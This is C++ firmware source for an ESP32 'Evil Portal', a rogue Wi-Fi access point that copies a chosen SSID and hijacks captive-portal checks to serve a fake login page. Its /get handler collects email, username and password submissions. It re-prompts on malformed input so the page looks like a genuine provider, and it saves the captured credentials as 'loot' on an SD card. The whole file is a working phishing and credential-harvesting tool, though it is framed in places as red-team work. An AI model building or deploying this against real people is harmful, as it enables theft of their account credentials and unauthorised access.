#include "EvilPortal.h"
#include "DeviceClock.h"
#include "SpecterSessions.h"
#include "bt_core.h"
#include "esp_random.h"
#include "esp_netif.h"
#include "PortalCredentialPolicy.h"
#ifdef SPECTER_HTTP_DIAGNOSTICS
#include "esp_heap_caps.h"
#endif

char apName[MAX_AP_NAME_SIZE] = "PORTAL";

#ifdef HAS_PSRAM
  char* index_html = nullptr;
#endif

// Inspect the transport directly; begin() itself has no success return value.
class PortalWebServer : public AsyncWebServer {
public:
  PortalWebServer() : AsyncWebServer(80) {}
  bool listening() const { return _server.status() == LISTEN; }
};
PortalWebServer server;

void EvilPortal::setup() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;

  submissions=xQueueCreate(4,sizeof(specter::PortalSubmission));
  submissionMutex=xSemaphoreCreateMutex();
  html_files = new LinkedList<String>();

  #ifdef HAS_SD
    if (sd_obj.supported) {
      sd_obj.listDirToLinkedList(html_files, "/", "html");

      #ifndef MARAUDER_V8
        Serial.println("Evil Portal Found " + (String)html_files->size() + " HTML files");
      #endif
    }
  #endif
}

void EvilPortal::cleanup() {
  if(submissionMutex)xSemaphoreTake(submissionMutex,portMAX_DELAY);
  this->runServer = false;
  if(submissionMutex)xSemaphoreGive(submissionMutex);
  saveSubmissions();
  #ifdef HAS_SD
  if(evidenceFile){evidenceFile.flush();evidenceFile.close();}
  #endif
  this->ap_index = -1;

  // Free the per-activation network resources so repeated Start/Stop cycles don't
  // leak: stop the DNS server (frees its UDP pcb) and tear down the SoftAP netif +
  // DHCP lease pool. Previously cleanup() freed only the PSRAM HTML buffer, so each
  // cycle leaked the DNS socket + AP netif and the web handlers grew unbounded (see
  // the register-once guard in startAP()).
  this->dnsServer.stop();
  server.end();
  WiFi.softAPdisconnect(true);

  #ifdef HAS_PSRAM
    free(index_html);
    index_html = nullptr;
  #endif
}

bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  Serial.println(F("@PORTAL:STEP begin"));
  if (!this->has_ap) {
    Serial.println(F("@PORTAL:STEP setap"));
    if (!this->setAP(ssids, access_points)) {
      Serial.println(F("@PORTAL:STEP setap FAIL (no SSID list, no selected AP, no /ap.config.txt)"));
      return false;
    }
  }
  Serial.print(F("@PORTAL:STEP setap OK ssid="));
  Serial.println(apName);

  Serial.println(F("@PORTAL:STEP sethtml"));
  if (!this->setHtml()) {
    Serial.println(F("@PORTAL:STEP sethtml FAIL"));
    return false;
  }
  Serial.println(F("@PORTAL:STEP sethtml OK"));

  if(!openEvidence()) {
    Serial.println(F("@PORTAL:ERROR SD_LOG_UNAVAILABLE"));
    this->sendToDisplay("SD submission log unavailable");return false;
  }
  Serial.println(F("@PORTAL:STEP evidence OK"));

  if(!startPortal()){
    cleanup();Serial.println(F("@PORTAL:ERROR AP_START_FAILED"));return false;
  }
  printStatus("ready");
  return true;
}

String EvilPortal::get_user_name() {
  return this->user_name;
}

String EvilPortal::get_password() {
  return this->password;
}

void EvilPortal::setupServer() {
  #ifndef HAS_PSRAM
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
      request->send_P(200, "text/html", index_html);
      #ifndef MARAUDER_V8
        Serial.println(F("client connected"));
      #endif
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("Client connected to server"));
      #endif
    });
  #else
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
      request->send(200, "text/html", index_html);
      #ifndef MARAUDER_V8
        Serial.println("client connected");
      #endif
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("Client connected to server"));
      #endif
    });
  #endif

  const char* captiveEndpoints[] = {
    "/hotspot-detect.html",
    "/library/test/success.html",
    "/success.txt",
    "/generate_204",
    "/gen_204",
    "/ncsi.txt",
    "/connecttest.txt",
    "/redirect"
  };

  for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
    
    #ifndef HAS_PSRAM
      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", index_html);
      });
    #else
      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
        request->send(200, "text/html", index_html);
      });
    #endif
  }

  server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send(200, "text/plain", WiFi.softAPSSID());
  });

  server.on("/get", HTTP_ANY, [this](AsyncWebServerRequest *request) {
    String user,pass;bool hasUser=false,hasPass=false,userIsEmail=false;
    const char* userKeys[]={"email","username","user","login"};
    const char* passKeys[]={"password","pass"};
    for(const char* key:userKeys){
      if(request->hasParam(key,true)){user=request->getParam(key,true)->value();hasUser=true;userIsEmail=(strcmp(key,"email")==0);break;}
      if(request->hasParam(key)){user=request->getParam(key)->value();hasUser=true;userIsEmail=(strcmp(key,"email")==0);break;}
    }
    for(const char* key:passKeys){
      if(request->hasParam(key,true)){pass=request->getParam(key,true)->value();hasPass=true;break;}
      if(request->hasParam(key)){pass=request->getParam(key)->value();hasPass=true;break;}
    }
    if(hasUser || hasPass){
      // Red-team input validation: apply real-login-form format rules so the
      // portal only accepts a well-formed email (or username) + password and
      // re-prompts on anything malformed, exactly like a normal provider page.
      // Email rules apply only when the captured field is an email; username
      // fields get a looser non-empty check so username-based templates work.
      bool userBad = hasUser && (userIsEmail
                        ? !specter::isPlausibleEmail(user.c_str(), user.length())
                        : !specter::meetsUsernamePolicy(user.c_str(), user.length()));
      bool passBad = hasPass && !specter::meetsPasswordPolicy(pass.c_str(), pass.length());
      if(userBad || passBad){
        Serial.print(F("@PORTAL:REJECT"));
        if(userBad) Serial.print(userIsEmail ? F(" email") : F(" username"));
        if(passBad) Serial.print(F(" password"));
        Serial.println();
        request->send(200,"text/html",
          "<html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
          "<script>setTimeout(function(){window.location.href='/';},1500);</script></head>"
          "<body style=\"font-family:sans-serif;text-align:center;margin-top:3em\">"
          "<p>That email or password doesn&#39;t look right. Please try again.</p></body></html>");
        return;
      }
      Serial.println(F("@PORTAL:ACCEPT"));
      const auto entry=specter::portalSubmission(user.c_str(),user.length(),hasUser,
        pass.c_str(),pass.length(),hasPass,millis());
      bool queued=false;
      if(submissions && submissionMutex){
        xSemaphoreTake(submissionMutex,portMAX_DELAY);
        if(runServer)queued=xQueueSend(submissions,&entry,0)==pdTRUE;
        xSemaphoreGive(submissionMutex);
      }
      if(!queued){request->send(503,"text/plain","Submission unavailable. Please retry.");return;}
    }
    request->send(200,"text/html",
      "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });
}

void EvilPortal::setHtmlFromSerial() {
  #ifndef MARAUDER_V8
    Serial.println(F("Setting HTML from serial..."));
  #endif
  const char *htmlStr = Serial.readString().c_str();
  #ifdef HAS_PSRAM
    index_html = (char*) ps_malloc(MAX_HTML_SIZE);
  #endif
  strlcpy(index_html, htmlStr, strlen(htmlStr));
  #ifdef HAS_PSRAM
    index_html[MAX_HTML_SIZE - 1] = '\0';
  #endif
  this->has_html = true;
  this->using_serial_html = true;
  #ifndef MARAUDER_V8
    Serial.println("html set");
  #endif
}

bool EvilPortal::setHtml() {
  if (this->using_serial_html) {
    #ifndef MARAUDER_V8
      Serial.println(F("html previously set"));
    #endif
    return true;
  }
  #ifndef MARAUDER_V8
    Serial.println(F("Setting HTML..."));
  #endif
  #ifdef HAS_SD
    File html_file = sd_obj.getFile("/" + this->target_html_name);
  #else
    File html_file;
  #endif
  if (!html_file) {
    #ifdef HAS_SCREEN
      this->sendToDisplay("Could not find /" + this->target_html_name);
      this->sendToDisplay(F("Touch to exit..."));
    #endif
    #ifndef MARAUDER_V8
      Serial.println("Could not find /" + this->target_html_name + ". Use stopscan...");
    #endif
    return false;
  }
  else {
    if (html_file.size() > MAX_HTML_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given HTML is too large. Touch to exit..."));
      #endif
      #ifndef MARAUDER_V8
        Serial.println("The provided HTML is too large.\nUse stopscan...");
      #endif
      return false;
    }
    String html = "";
    while (html_file.available()) {
      char c = html_file.read();
      if (isPrintable(c))
        html.concat(c);
    }
    #ifdef HAS_PSRAM
      index_html = (char*) ps_malloc(MAX_HTML_SIZE);
    #endif
    strlcpy(index_html, html.c_str(), strlen(html.c_str()));
    #ifdef HAS_PSRAM
      index_html[MAX_HTML_SIZE - 1] = '\0';
    #endif
    this->has_html = true;
    // Portal template lint: warn (don't block) if the page has no field whose
    // name matches a credential key the /get handler captures. Catches a
    // template that can never collect anything before it is deployed live.
    {
      String probe = html;            // small (< MAX_HTML_SIZE); copy is fine
      probe.toLowerCase();
      static const char* kCaptureKeys[] =
        {"email", "username", "user", "login", "password", "pass"};
      bool hasField = false;
      for (const char* k : kCaptureKeys) {
        if (probe.indexOf(String("name=\"") + k + "\"") >= 0 ||
            probe.indexOf(String("name='") + k + "'") >= 0 ||
            probe.indexOf(String("name=") + k) >= 0) {
          hasField = true;
          break;
        }
      }
      if (!hasField)
        Serial.println(F("@PORTAL:WARN NO_CAPTURE_FIELDS "
                         "template has no email/username/password input"));
    }
    #ifndef MARAUDER_V8
      Serial.println("html set");
    #endif
    html_file.close();
    return true;
  }

}

bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  // See if there are selected APs first
  int targ_ap_index = -1;
  String ap_config = "";
  String temp_ap_name = "";
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      temp_ap_name = access_points->get(i).essid;
      targ_ap_index = i;
      break;
    }
  }
  // If there are no SSIDs and there are no APs selected, pull from file
  // This means the file is last resort
  if ((ssids->size() <= 0) && (temp_ap_name == "")) {
    return this->setAPFromConfig();
  }
  // There are SSIDs in the list but there could also be an AP selected
  // Priority is SSID list before AP selected and config file
  else if (ssids->size() > 0) {
    ap_config = ssids->get(0).essid;
    if (ap_config.length() > MAX_AP_NAME_SIZE) {
      #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
        this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
      #endif
      #ifndef MARAUDER_V8
        Serial.println("The provided AP name is too large.\nUse stopscan...");
      #endif
      return false;
    }
    #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
      this->sendToDisplay(F("AP name from SSID list"));
      this->sendToDisplay("AP name: " + ap_config);
    #endif
    #ifndef MARAUDER_V8
      Serial.println("AP name from SSID list: " + ap_config);
    #endif
  }
  else if (temp_ap_name != "") {
    if (temp_ap_name.length() > MAX_AP_NAME_SIZE) {
      #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
        this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
      #endif
      #ifndef MARAUDER_V8
        Serial.println("The given AP name is too large.\nUse stopscan...");
      #endif
    }
    else {
      ap_config = temp_ap_name;
      #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
        this->sendToDisplay(F("AP name from AP list"));
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      #ifndef MARAUDER_V8
        Serial.println("AP name from AP list: " + ap_config);
      #endif
    }
  }
  else {
    #ifndef MARAUDER_V8
      Serial.println(F("Could not configure Access Point. Use stopscan..."));
    #endif
    #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
      this->sendToDisplay(F("Could not configure Access Point.\nTouch to exit..."));
    #endif
  }

  if (ap_config != "") {
    strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE);
    this->has_ap = true;
    #ifndef MARAUDER_V8
      Serial.println(F("ap config set"));
    #endif
    this->ap_index = targ_ap_index;
    return true;
  }
  else
    return false;

}

bool EvilPortal::setAPFromConfig() {
  #ifdef HAS_SD
    File ap_config_file = sd_obj.getFile("/ap.config.txt");
  #else
    File ap_config_file;
  #endif

  if (!ap_config_file || ap_config_file.size() > MAX_AP_NAME_SIZE) {
    if (ap_config_file)
      ap_config_file.close();
    return false;
  }

  String ap_config = ap_config_file.readString();
  ap_config_file.close();

  if (this->setAP(ap_config)) {
    this->ap_index = -1;
    return true;
  }

  return false;
}

bool EvilPortal::setAP(String essid) {
  if (essid == "")
    return false;

  if (essid.length() > MAX_AP_NAME_SIZE) {
    return false;
  }

  strncpy(apName, essid.c_str(), MAX_AP_NAME_SIZE - 1);
  apName[MAX_AP_NAME_SIZE - 1] = '\0';
  this->has_ap = true;
  #ifndef MARAUDER_V8
    Serial.println(F("ap config set"));
  #endif
  return true;
}

bool EvilPortal::startAP() {
  const IPAddress AP_IP(172, 0, 0, 1);

  // Bring the SoftAP up one call at a time so a failure names the exact step
  // on the serial console / GUI instead of a single opaque AP_START_FAILED.
  Serial.println(F("@PORTAL:STEP wifi_mode AP"));
  if (!WiFi.mode(WIFI_AP)) {
    Serial.println(F("@PORTAL:STEP wifi_mode FAIL"));
    return false;
  }

  Serial.println(F("@PORTAL:STEP softap_config"));
  if (!WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0))) {
    Serial.println(F("@PORTAL:STEP softap_config FAIL"));
    return false;
  }

  Serial.print(F("@PORTAL:STEP softap ssid="));
  Serial.println(apName);
  if (!WiFi.softAP(apName)) {
    Serial.println(F("@PORTAL:STEP softap FAIL"));
    return false;
  }
  Serial.print(F("@PORTAL:STEP softap OK ip="));
  Serial.println(WiFi.softAPIP());

  #ifndef MARAUDER_V8
    Serial.print(F("ap ip address: "));
    Serial.println(WiFi.softAPIP());
  #endif

  // Register the web-server endpoints + captive handler ONCE for the app lifetime.
  // setupServer() appends ~12 handlers and addHandler() allocates a
  // CaptiveRequestHandler; re-running them on every Start leaked those per activation
  // (server._handlers grew unbounded). They are owned by the global `server` and this
  // is the singleton evil_portal_obj, so once is enough. The TCP listener, AP,
  // and DNS are per activation and must be rebuilt after cleanup().
  static bool s_server_registered = false;
  if (!s_server_registered) {
    this->setupServer();
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
    s_server_registered = true;
  }

  server.end();
#ifdef SPECTER_HTTP_DIAGNOSTICS
  Serial.printf("[portal-http] before listen: internal_free=%u internal_largest=%u\n",
    (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT),
    (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT));
#endif
  server.begin();
  Serial.println(F("@PORTAL:STEP http_listen"));
  if (!server.listening()) {
    Serial.println(F("@PORTAL:ERROR HTTP_LISTEN_FAILED"));
    return false;
  }
  Serial.println(F("@PORTAL:STEP http_listen OK"));

  Serial.println(F("@PORTAL:STEP dns"));
  if(!this->dnsServer.start(53, "*", WiFi.softAPIP())) {
    Serial.println(F("@PORTAL:STEP dns FAIL"));
    return false;
  }
  Serial.println(F("@PORTAL:STEP dns OK"));

  // Ensure the SoftAP DHCP server is actually running, and report its state.
  // A client failing to get an IP on a portal start shows up as a DHCP server
  // that is not in the STARTED state (0=INIT, 1=STARTED, 2=STOPPED).
  //
  // Arduino's softAP() skips esp_netif_dhcps_start() whenever a static AP IP was
  // set via softAPConfig() (it assumes softAPConfig handled it), but softAPConfig
  // only *restarts* a server that was already running. On a fresh AP netif the
  // server sits in INIT and never serves leases. Start it explicitly here so the
  // captive portal can hand out addresses.
  {
    esp_netif_t* ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (!ap_netif) {
      Serial.println(F("@PORTAL:STEP dhcp FAIL no_ap_netif"));
    } else {
      esp_netif_dhcp_status_t dhcp_status = ESP_NETIF_DHCP_INIT;
      esp_netif_dhcps_get_status(ap_netif, &dhcp_status);
      if (dhcp_status != ESP_NETIF_DHCP_STARTED) {
        esp_err_t dhcp_err = esp_netif_dhcps_start(ap_netif);
        esp_netif_dhcps_get_status(ap_netif, &dhcp_status);
        if (dhcp_status != ESP_NETIF_DHCP_STARTED) {
          Serial.print(F("@PORTAL:STEP dhcp FAIL start err=0x"));
          Serial.println((unsigned long)dhcp_err, HEX);
        }
      }
      if (dhcp_status == ESP_NETIF_DHCP_STARTED)
        Serial.println(F("@PORTAL:STEP dhcp OK started"));
      else {
        Serial.print(F("@PORTAL:STEP dhcp WARN not_started status="));
        Serial.println((int)dhcp_status);
      }
    }
  }

  #ifndef MARAUDER_V8
    Serial.println(F("Evil Portal READY"));
  #endif
  #ifdef HAS_SCREEN
    this->sendToDisplay(F("Evil Portal READY"));
  #endif
  return true;
}

bool EvilPortal::startPortal() {
  // wait for flipper input to get config index
  if(!this->startAP())return false;
  this->runServer = true;
  return true;
}

void EvilPortal::sendToDisplay(String msg) {
  #ifdef HAS_SCREEN
    String display_string = "";
    display_string.concat(msg);
    int temp_len = display_string.length();
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }
    display_obj.loading = true;
    display_obj.queueLine(display_string);
    display_obj.loading = false;
  #endif
}

void EvilPortal::main(uint8_t scan_mode) {
  if (scan_mode != WIFI_SCAN_EVIL_PORTAL || !this->has_ap || !this->has_html) {
    return;
  }

  this->dnsServer.processNextRequest();

  saveSubmissions();
}

bool EvilPortal::openEvidence(){
  #ifdef HAS_SD
  if(!sd_obj.supported || !submissions || !submissionMutex)return false;
  if(evidenceFile)evidenceFile.close();
  xQueueReset(submissions);savedSubmissions=0;
  String root=specter::sessionActive()?specter::sessionDirectory("captures"):String("/portal_loot");
  if(!root.length() || (!SD.exists(root) && !SD.mkdir(root)))return false;
  for(unsigned i=0;i<10;++i){
    char name[64];snprintf(name,sizeof(name),"/portal_%08lx_%08lx.jsonl",(unsigned long)esp_random(),(unsigned long)esp_random());
    evidencePath=root+name;if(!SD.exists(evidencePath))break;
    if(i==9)return false;
  }
  evidenceFile=SD.open(evidencePath,FILE_WRITE);
  if(!evidenceFile)return false;
  if(!specter::registerOutput(evidencePath,"portal-submissions")){
    evidenceFile.close();SD.remove(evidencePath);return false;
  }
  return true;
  #else
  return false;
  #endif
}

void EvilPortal::saveSubmissions(){
  #ifdef HAS_SD
  if(!submissions)return;
  specter::PortalSubmission item;
  while(xQueueReceive(submissions,&item,0)==pdTRUE){
    String record="{\"utc\":\""+marauder::clockUtc()+"\",\"received_ms\":"+String(item.receivedMs)+
      ",\"username\":\""+bt_json_escape(String(item.user))+"\",\"password\":\""+bt_json_escape(String(item.password))+
      "\",\"has_username\":"+String(item.hasUser?"true":"false")+",\"has_password\":"+String(item.hasPassword?"true":"false")+
      ",\"truncated\":"+String(item.truncated?"true":"false")+"}";
    record += "\n";
    if(!evidenceFile || evidenceFile.print(record)!=record.length()){
      Serial.println(F("@PORTAL:ERROR SD_WRITE_FAILED"));continue;
    }
    evidenceFile.flush();++savedSubmissions;
    Serial.printf("@PORTAL:SUBMISSION %lu\n",(unsigned long)savedSubmissions);
    sendToDisplay("Submission saved to SD ("+String(savedSubmissions)+")");
  }
  #endif
}

void EvilPortal::printStatus(const char* state){
  Serial.printf("@PORTAL:STATUS {\"state\":\"%s\",\"ssid\":\"%s\",\"template\":\"%s\",\"loot\":\"%s\",\"saved\":%lu,\"ip\":\"%s\"}\n",
    state?state:(active()?"running":"stopped"),bt_json_escape(String(apName)).c_str(),
    bt_json_escape(target_html_name).c_str(),bt_json_escape(evidencePath).c_str(),
    (unsigned long)savedSubmissions,WiFi.softAPIP().toString().c_str());
}
